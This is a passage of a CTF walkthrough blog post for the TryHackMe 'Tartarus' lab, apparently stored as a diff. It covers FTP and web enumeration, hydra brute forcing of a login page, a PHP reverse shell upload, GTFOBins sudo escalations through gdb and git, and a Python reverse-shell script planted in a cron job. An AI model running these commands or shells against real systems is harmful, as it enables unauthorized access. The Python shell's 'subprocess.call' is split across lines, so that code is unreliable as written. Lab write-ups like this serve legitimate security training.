@@ -1,0 +1,312 @@
+I"�B<h1 id="tryhackme---tartarus">TryHackMe - Tartarus</h1>
+<hr />
+
+<p>This is an easy room on <a href="https://tryhackme.com/">TryHackMe</a>. TryHackMe is a great resource for anybody looking to learn more about cybersecurity and CTFs. The room states this is for beginners and focuses on enumeration and basic privelege escalation techniques. To start this box, I’ve made a <code class="language-plaintext highlighter-rouge">tartarus</code> directory and an <code class="language-plaintext highlighter-rouge">nmap</code> directory within that to hold all the scans for the box.</p>
+
+<h2 id="nmap-scan">nmap Scan</h2>
+
+<p>Here’s the output from the nmap scan:
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -oN nmap/tartarus_initial.txt 10.10.17.3
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-12 08:37 CDT
+Nmap scan report for 10-10-17-3-static.midco.net (10.10.17.3)
+Host is up (0.13s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.11.12.75
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
+|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
+|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 36.43 seconds
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<h2 id="ftp-enumeration">ftp Enumeration</h2>
+
+<p>The nmap scan reveals that the <code class="language-plaintext highlighter-rouge">ftp</code> service allows for anonymous login. Logging in we find a file named <code class="language-plaintext highlighter-rouge">test.txt</code>. using <code class="language-plaintext highlighter-rouge">get</code> and taking a look on our attacking machine reveals nothing…
+<br />
+<br /></p>
+
+<p><img src="assets/images/tartarus/tartarus_ftp.png" alt="" />
+<br />
+<br /></p>
+
+<p>However, there was an extra directory than usual in the ftp service. It’s easy to overlook since it’s <code class="language-plaintext highlighter-rouge">...</code>. Once we get into the directory, we see another file named <code class="language-plaintext highlighter-rouge">yougotgoodeyes.txt</code>. That file does have some good info.
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat yougotgoodeyes.txt
+/sUp3r-s3cr3t
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<h2 id="web-enumeration">Web Enumeration</h2>
+
+<p>The contents of the ftp file look like a web directory, so we’ll head over there to see what’s in the directory. It looks like there’s a login page in the <code class="language-plaintext highlighter-rouge">/sUp3r-s3cr3t</code> directory.
+<br />
+<br /></p>
+
+<p><img src="assets/images/tartarus/tartarus_login.png" alt="" />
+<br />
+<br /></p>
+
+<p>Considering the fact that we have no credentials to try, let’s keep looking at the webpage. <code class="language-plaintext highlighter-rouge">Gobuster</code> returns nothing, but checking the <code class="language-plaintext highlighter-rouge">robots.txt</code> we get an interesting hint:
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: *
+Disallow : /admin-dir
+
+I told d4rckh we should hide our things deep.
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>Following the hint and navigating to the <code class="language-plaintext highlighter-rouge">/admin-dir</code> directory we get a couple of files, <code class="language-plaintext highlighter-rouge">userid</code> and <code class="language-plaintext highlighter-rouge">credentials.txt</code>. I’m going to try and use these files to brute force into the login page we found earlier.
+<br />
+<br /></p>
+
+<p align="center">
+  <img src="assets/images/tartarus/tartarus_admin.png" />
+</p>
+<p><br />
+<br /></p>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>We’ll be using <code class="language-plaintext highlighter-rouge">hydra</code> to brute force into the login. Honestly the syntax for brute forcing http-post-forms with hydra has been a little tricky so I’m glad for the opportunity to test out how to form the command. Here’s the basic syntax for hydra:
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L /path/to/username.txt -P /path/to/passwords.txt 10.10.9.176 http-post-form "/path/to/login:username=^USER^&amp;password=^PASS^:error message here"
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>We already know the path to the login, <code class="language-plaintext highlighter-rouge">/sUp3r-s3cr3t/authenticate.php</code>. We also know the username file and the password file, <code class="language-plaintext highlighter-rouge">userid</code> and <code class="language-plaintext highlighter-rouge">credentials.txt</code>. If we try logging into the page incorrectly we get a message saying <code class="language-plaintext highlighter-rouge">Incorrect username!</code>. So the command ends up being:
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L userid -P credentials.txt 10.10.9.176 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;password=^PASS^:Incorrect username"
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>We get the following in return:
+<br />
+<br /></p>
+
+<p><img src="assets/images/tartarus/tartarus_user.png" alt="" />
+<br />
+<br /></p>
+
+<p>Now we know the username. So we can specify the command a bit more and get the password. Trying to login with the correct username but not password gives us an error message of <code class="language-plaintext highlighter-rouge">Incorrect password!</code> so now we can alter our command:
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l CORRECT_USERNAME -P credentials.txt 10.10.9.176 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;password=^PASS^:Incorrect password!"
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>And here are the following results:
+<br />
+<br /></p>
+
+<p><img src="assets/images/tartarus/tartarus_enox.png" alt="" />
+<br />
+<br /></p>
+
+<p>Now we can login and are greeted with a page allowing us to upload a file. We can upload a reverse shell and set a listener on our attacking machine to gain our initial access.
+<br />
+<br /></p>
+
+<p align="center">
+  <img src="assets/images/tartarus/tartarus_upload.png" />
+</p>
+<p><br />
+<br /></p>
+
+<p>It was at this point that I started to have some trouble finding where I uploaded my reverse shell. I tried navigating to whatever directories I had already discovered and looking for my <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code> file, but I had no such luck. So I turned to <code class="language-plaintext highlighter-rouge">gobuster</code> to see what else was behind the <code class="language-plaintext highlighter-rouge">/sUp3r-s3cr3t</code> directory.
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://10.10.202.140/sUp3r-s3cr3t/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 100 -o gobuster_secret.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.202.140/sUp3r-s3cr3t/
+[+] Threads:        100
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/08/17 07:30:13 Starting gobuster
+===============================================================
+/home.php (Status: 302)
+/images (Status: 301)
+/authenticate.php (Status: 200)
+Progress: 55037 / 220561 (24.95%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2020/08/17 07:32:38 Finished
+===============================================================
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>Aha! The <code class="language-plaintext highlighter-rouge">images</code> folder looks like a great place to look. Looking in there, there’s an <code class="language-plaintext highlighter-rouge">uploads</code> folder as well. It’s in there we see the <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code>
+<br />
+<br /></p>
+
+<p><img src="assets/images/tartarus/tartarus_shell.png" alt="" />
+<br />
+<br /></p>
+
+<p>So now we just load that page with a netcat listener on our attacking machine and we’ll get our shell.
+<br />
+<br /></p>
+
+<p><img src="assets/images/tartarus/tartarus_initialshell.png" alt="" /></p>
+
+<h2 id="from-user-www-data-to-user-thirtytwo">From user www-data to user thirtytwo</h2>
+
+<p>Initial enumeration of the system gives us a way to possibly move to another user. Running <code class="language-plaintext highlighter-rouge">sudo -l</code> lets us know we can run <code class="language-plaintext highlighter-rouge">gdb</code> as user <code class="language-plaintext highlighter-rouge">thirtytwo</code>.
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries for www-data on ubuntu-xenial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu-xenial:
+    (thirtytwo) NOPASSWD: /var/www/gdb
+</code></pre></div></div>
+
+<p>Searching up <code class="language-plaintext highlighter-rouge">gdb</code> command on gtfo bins tells us a command we can run to get a shell as that user.
+<br />
+<br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">gdb -nx -ex '!sh' -ex quit</code>
+<br />
+<br /></p>
+
+<p>Modifying that command for our purposes gives us:
+<br />
+<br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit</code>
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit        
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+
+whoami
+thirtytwo
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>We now have a shell as user <code class="language-plaintext highlighter-rouge">thirtytwo</code>.</p>
+
+<h2 id="from-user-thirtytwo-to-user-d4rckh">From user thirtytwo to user d4rckh</h2>
+
+<p>We need to move to user <code class="language-plaintext highlighter-rouge">d4rckh</code>. But first we need to stabilize the shell My recommended way is the script in the John Hammond repo above, but you can also do so manually <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">here</a> into our reverse shell. Basic enumeration of other parts of the file system gives us the user <code class="language-plaintext highlighter-rouge">d4rckh</code>. Looking inside of his home directory there’s the user flag, and it turns out we can cat that flag.
+<br />
+<br /></p>
+
+<p>HINT: When I first started stabilizing shells, I wondered to myself if there was a way to automate such a task. Of course, someone had already done so. <a href="https://github.com/JohnHammond/poor-mans-pentest">Here’s</a> a link to John Hammond’s github page where he has such an automated script called <code class="language-plaintext highlighter-rouge">stabilize_shell.sh</code>. Take a look at the repo and the script, it’s really quite clever how he did it. He also has a great lecture on youtube <a href="https://www.youtube.com/watch?v=f2aSXGbD0NE">here</a> to follow along with the github repo. I can’t say enough about John Hammond’s youtube channel. I’ve learned a tremendous amount from it, and I encourage anyone interested in CTFs and cybersecurity to check it out. Back to the box.</p>
+
+<p><img src="assets/images/tartarus/tartarus_userflag.png" alt="" />
+<br />
+<br /></p>
+
+<p>Looking in the home directory for <code class="language-plaintext highlighter-rouge">thirtytwo</code>, there’s a file named <code class="language-plaintext highlighter-rouge">note.txt</code>. It reads:
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hey 32, the other day you were unable to clone my github repository.
+Now you can use git. Took a while to fix it but now its good :)
+
+~D4rckh
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>Hmm. This looks similar to the lateral movement we just did. Again we should stabilize the shell. After the stabilization, we should do a little more research on the <code class="language-plaintext highlighter-rouge">git</code> command on <a href="https://gtfobins.github.io/">GTFObins</a>. It turns out we can use <code class="language-plaintext highlighter-rouge">PAGER='sh -c "exec sh 0&lt;&amp;1"' sudo -u d4rckh /usr/bin/git -p help</code> to invoke git with the <code class="language-plaintext highlighter-rouge">less</code> command. From there we can execute <code class="language-plaintext highlighter-rouge">!/bin/bash</code> to give us a shell as <code class="language-plaintext highlighter-rouge">d4rckh</code>. We now have a shell as user <code class="language-plaintext highlighter-rouge">d4rckh</code>.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>the user <code class="language-plaintext highlighter-rouge">d4rckh</code> has a file in his home directory named <code class="language-plaintext highlighter-rouge">cleanup.py</code>. It turns out we have write permissions for <code class="language-plaintext highlighter-rouge">cleanup.py</code>, and it runs every 2 minutes. We know it runs every two mintues by checking the contents of <code class="language-plaintext highlighter-rouge">/etc/crontab</code>, and that we have write permission by running <code class="language-plaintext highlighter-rouge">ls -la</code> in the directory containing the file.
+<br />
+<br /></p>
+
+<p><img src="assets/images/tartarus/tartarus_crontab.png" alt="" />
+<br />
+<br /></p>
+
+<p>So now all we have to do is rewrite the <code class="language-plaintext highlighter-rouge">cleanup.py</code> to give us a reverse shell on our attacking machine. You can find the python3 reverse shell on <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey</a>. We will need to modify it so it’s not a terminal command as well as change the ip address to our own. It should look something like the following with your own ip substituted.
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># -*- coding: utf-8 -*-
+#!/usr/bin/env python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.10.1",1234))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.c
+all(["/bin/sh","-i"])
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>Now we just set up a listener, and wait 2 minutes.
+<br />
+<br /></p>
+:ET
